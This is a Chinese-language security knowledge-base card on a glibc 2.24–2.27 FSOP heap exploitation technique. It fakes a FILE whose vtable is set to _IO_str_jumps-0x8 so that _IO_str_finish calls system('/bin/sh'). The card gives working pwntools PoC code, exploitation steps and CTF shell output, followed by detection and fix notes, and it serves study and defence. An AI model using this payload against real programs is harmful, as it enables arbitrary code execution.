---
id: binary-pwn-heap-io-str-jumps-finish-free-buffer-system
title: glibc 2.24–2.27 vtable 校验绕过：vtable 指向 _IO_str_jumps-0x8，让 _IO_OVERFLOW 槽落到 _IO_str_finish 经 _s._free_buffer 调 system
type: scenario
domain: binary
path: binary/pwn/heap
technique: fsop-io-str-jumps-finish-free-buffer-system
tags:
- pwn
- heap
- glibc
- fsop
- io-str-jumps
- io-str-finish
- vtable
- house-of-orange
- unsorted-bin
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
affected_versions: glibc 2.24–2.27（原文：2.24 起 _IO_vtable_check 校验 vtable 必须落在 __libc_IO_vtables 段；_IO_str_finish 直到 2.27 仍通过 _s._free_buffer 间接调用，2.28 起改为直接 free 而使该手法失效）
verification:
  verified_by: verifier-V287
  verified_at: '2026-11-08T05:35:59+08:00'
  notes: 已对照原文与全部6图核对：_IO_FILE_plus结构（01）、IO_list_all→stderr→stdout→stdin chain（02）、堆布局0x410/0x20/0xaf0 unsorted fd=bk=0x7ffff7bc3b78（03）、gdb fork exec /usr/bin/dash（04）、malloc corruption 0x7fff7bc5520后shell ls（05/06）。卡的技术点（2.24+ _IO_vtable_check、vtable=_IO_str_jumps-0x8错位到__finish、fp+0xe8=_s._free_buffer=system、_IO_buf_base=/bin/sh、2.28起失效）与原文一致；原文最终exp确实用libc-2.23.so演示，卡在PoC/边界已注明，affected_versions按原文2.24–2.27保留（2.23基础链由既有House of Orange卡覆盖，未重复）。dedup除自身外候选均related（House of Orange 2.23、house-of-some、largebin-io-list_all等），非同一链；dup-scan无涉及pair。未验证点：未复跑exp；frontmatter无sources/source_url。
url: /docs/binary/pwn/heap/binary-pwn-heap-io-str-jumps-finish-free-buffer-system/
draft: false
kb_aliases:
- _IO_str_finish 利用
- _IO_str_jumps - 0x8
- _IO_vtable_check 绕过
- House of Orange 2.24+
- _s._free_buffer 劫持
- FSOP 合法 vtable 偏移
---

## 一句话结论

glibc 2.24 起 `_IO_vtable_check` 要求 FILE 的 vtable 指针落在 `__libc_IO_vtables` 段内，不能再像 2.23 那样把 vtable 指向堆上伪造的跳表；但可以把 vtable 设成合法跳表 `_IO_str_jumps - 0x8`，使 `_IO_flush_all_lockp` 在 vtable+0x18 处调用的 `_IO_OVERFLOW` 槽正好错位落到 `_IO_str_jumps` 的 `__finish` 槽（即 `_IO_str_finish`）；再把 `fp->_IO_buf_base` 设为 `/bin/sh`、把 `fp+0xe8`（`_IO_strfile._s._free_buffer`）设为 `system`，就能在退出/abort 的 flush 阶段执行 `system("/bin/sh")`。

## 原理

- `_IO_jump_t` 的槽位顺序是 `__dummy(0x00)`、`__dummy2(0x08)`、`__finish(0x10)`、`__overflow(0x18)`……`_IO_flush_all_lockp` 通过 `_IO_OVERFLOW(fp, EOF)` 宏读取 `vtable + 0x18` 调用。把 vtable 指向 `_IO_str_jumps - 0x8` 后，`vtable + 0x18 = _IO_str_jumps + 0x10`，正好是 `_IO_str_jumps.__finish` 字段，即 `_IO_str_finish`。
- `_IO_vtable_check` 只校验 vtable 指针是否位于 `__start___libc_IO_vtables` 与 `__stop___libc_IO_vtables` 之间；`_IO_str_jumps - 0x8` 仍在该段内（`_IO_str_jumps` 不是段首对象），因此校验通过。它不校验「vtable 是否指向某个跳表对象的起始地址」，这是错位槽能成立的前提。
- `_IO_str_finish`（glibc ≤2.27）的实现是：若 `fp->_IO_buf_base` 非空且 `_flags` 不含 `_IO_USER_BUF(0x1)`，就调用 `((_IO_strfile *)fp)->_s._free_buffer(fp->_IO_buf_base)`。`_s._free_buffer` 位于 `fp + 0xe8`（`_IO_FILE` 0xe0 字节之后的第二个 `_IO_str_fields` 函数指针）。因此把它改成 `system`、把 `_IO_buf_base` 改成 libc 里的 `/bin/sh` 地址，`_IO_str_finish` 就等价于 `system("/bin/sh")`。
- 触发前提仍是 FSOP 的 flush 条件：`_IO_flush_all_lockp` 对链表节点检查 `fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base`（或 wide 分支），满足才调用 `_IO_OVERFLOW`。伪造 FILE 时置 `_mode=0`、`_IO_write_base=0`、`_IO_write_ptr=1` 即可。
- 进入 `_IO_flush_all_lockp` 的方式与 House of Orange 相同：先用 unsorted bin attack 把 `_IO_list_all` 写成 `main_arena+88`，其 `_chain` 字段（+0x68）与 `main_arena+0xC0` 的 smallbin[4]（0x60 大小）重叠；把待伪造的 unsorted chunk size 改成 0x61，下一次 malloc 把它链入 smallbin[4]，`_IO_list_all` 遍历时就会走到这块可控制的数据区，把它当作 fake FILE。
- 该手法在 glibc 2.28 起失效：`_IO_str_finish` 不再读 `_free_buffer`，而是直接 `free(fp->_IO_buf_base)`，函数指针劫持点消失。

## 触发条件

- glibc 2.24–2.27（2.28+ 失效）；目标有可控制的堆溢出/UAF/任意写，能完成 unsorted bin attack 改写 `_IO_list_all` 或直接把 `_IO_list_all` 指向可控堆块。
- 已泄露 libc 基址，能计算 `_IO_str_jumps`（非导出符号，需按 `_IO_str_underflow` 引用反推）、`system`、`/bin/sh` 的地址。
- 能在 fake FILE 中控制 `_mode`、`_IO_write_base`、`_IO_write_ptr`、`_IO_buf_base`、`_flags`、vtable 以及 `fp+0xe8` 的 `_free_buffer` 槽。
- 程序退出路径会调用 `_IO_flush_all_lockp`（`exit`、main 返回、`malloc_printerr` → `abort`）。

## 利用步骤

1. 泄露 libc/heap；按 libc 版本用 `_IO_file_jumps` 之后、包含 `_IO_str_underflow` 指针引用的结构定位 `_IO_str_jumps`：
   `for ref in libc.search(p64(libc.sym['_IO_str_underflow'])): if ref-0x20 > libc.sym['_IO_file_jumps']: return ref-0x20`。
2. 构造 unsorted bin attack：把一个 unsorted chunk 的 `bk` 改成 `_IO_list_all-0x10`，触发 malloc 让 `_IO_list_all = main_arena+88`；同时把该 chunk 的 size 设为 0x61，使其随后链入 smallbin[4]，成为 `main_arena+88+0x68` 的 `_chain` 目标。
3. 在该 0x60 块的数据区布置 fake FILE：`_flags=0`、`_mode=0`、`_IO_write_base=0`、`_IO_write_ptr=1`、`_IO_buf_base=libc /bin/sh`，在 +0xd8 写 `_IO_str_jumps-0x8`，在 +0xe8 写 `system`。
4. 触发下一次 malloc 报错/程序退出：`_IO_flush_all_lockp` 遍历到 fake FILE，条件满足后调用 `_IO_OVERFLOW` → `_IO_str_finish` → `system("/bin/sh")`。
5. 调试断点：`_IO_flush_all_lockp`、`_IO_str_finish`、`system`；核对 vtable 是否为 `_IO_str_jumps-0x8`、`fp+0xe8` 是否为 system、`_IO_buf_base` 是否为 `/bin/sh`。

## PoC

原文最终 exp 的关键布局（原文 `libc=ELF('libc-2.23.so')`，机制适用于 2.24–2.27）：

```python
def get_IO_str_jumps():
    IO_file_jumps_offset = libc.sym['_IO_file_jumps']
    IO_str_underflow_offset = libc.sym['_IO_str_underflow']
    for ref_offset in libc.search(p64(IO_str_underflow_offset)):
        possible_IO_str_jumps_offset = ref_offset - 0x20
        if possible_IO_str_jumps_offset > IO_file_jumps_offset:
            return possible_IO_str_jumps_offset

io_str_jumps = libc_base + get_IO_str_jumps()
_IO_list_all = libc_base + libc.sym['_IO_list_all']
system_addr  = libc_base + libc.sym['system']
binsh_addr   = libc_base + libc.search(b'/bin/sh').__next__()

fsop  = p64(0) + p64(0x61) + p64(0) + p64(_IO_list_all - 0x10)  # unsorted bin attack -> _IO_list_all = main_arena+88
fsop += p64(0)          # _IO_write_base
fsop += p64(1)          # _IO_write_ptr > _IO_write_base
fsop += p64(0)          # _IO_write_end
fsop += p64(binsh_addr) # _IO_buf_base = "/bin/sh"
fsop  = fsop.ljust(0xd8, b'\x00')
fsop += p64(io_str_jumps - 0x8)  # vtable：校验仍在 __libc_IO_vtables 段，+0x18 槽落到 _IO_str_finish
fsop += p64(0)                   # _IO_FILE + 0xe0
fsop += p64(system_addr)         # _IO_FILE + 0xe8 = _s._free_buffer
payload = b'd'*0x400 + p64(0) + p64(0x21) + p64(0) + p64(0) + fsop

edit(len(payload), payload)
io.recv(); io.sendline(str(1))   # 下一次 malloc 触发 flush -> system("/bin/sh")
```

```text
# 触发时的典型报错（原文截图）
*** Error in `./pwn': malloc(): memory corruption: 0x00007fff7bc5520 ***
$ ls
exp.py  exp1.py  ld-2.23.so  libc-2.23.so  pwn
```

## 变体与关联

- 变体：glibc 2.23 无 vtable 校验，可直接伪造 vtable；见 `[[binary-pwn-heap-house-of-orange-unsortedbin-io-list-all-fsop-system]]`。
- 变体：同一 `_IO_str_jumps` 还有 `_IO_str_overflow` 槽可利用（House of Pig 用 largebin attack + tcache stashing 把 `system` 写进 `__free_hook` 后再触发），见 `[[binary-pwn-heap-house-of-pig-io-str-overflow-tcache-stashing-freehook-system]]`；本卡的错位槽思路是「合法 vtable + 槽位偏移」，与之的区别是不依赖 `__free_hook`。
- 变体：2.28+ `_IO_str_finish` 改为直接 `free`，需换 House of Apple/Apple2、House of Cat 等 wide vtable 或 `setcontext` 路线，见 `[[binary-pwn-heap-house-of-apple-2-stderr-fsop]]`、`[[binary-pwn-heap-house-of-cat-wfile-seekoff-wide-vtable-bypass-vtable-check]]`。
- 边界：`_IO_str_jumps - 0x8` 是否在 `__libc_IO_vtables` 段内取决于具体 libc 布局，换版本需重新确认；若 vtable 校验走 `_IO_vtable_check` 失败会直接 abort。原文最终 exp 使用 libc-2.23 演示，2.24+ 需按目标 libc 校验段边界与 `_IO_str_finish` 实现。

## 检测与防御

- 检测：崩溃回溯出现 `_IO_flush_all_lockp → _IO_str_finish`；`_IO_list_all` 指向 `main_arena` 附近或堆地址；fake FILE 的 vtable 为 `_IO_str_jumps-0x8` 这类「合法段内非对齐」指针；`fp+0xe8` 出现 libc `system` 地址、`_IO_buf_base` 指向 `/bin/sh`。
- 修复：升级到 glibc 2.28+（`_IO_str_finish` 不再调用 `_free_buffer`），并保持 `_IO_vtable_check` 补丁；消除堆溢出/UAF/任意写。
- 加固：启用 full RELRO/PIE 增加地址泄露难度；监控 `_IO_list_all` 与 FILE 链表的异常改写；对 exit 阶段异常调用栈告警。
